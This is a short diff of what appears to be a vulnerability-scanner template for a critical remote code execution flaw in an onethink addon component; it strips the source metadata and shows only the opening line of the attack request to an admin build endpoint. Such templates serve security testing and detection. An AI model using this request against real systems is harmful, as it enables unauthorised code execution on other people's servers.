@@ -3,12 +3,8 @@ info:
   name: onethink AddоnkCоntrоllеr.сlаrt.php组件 任意代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xm68t6ne1apn6gqf'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xm68t6ne1apn6gqf
-    fofa: 暂无
 http:
 - raw:
   - 'POST /admin.php?s=/Addons/build.html HTTP/1.1
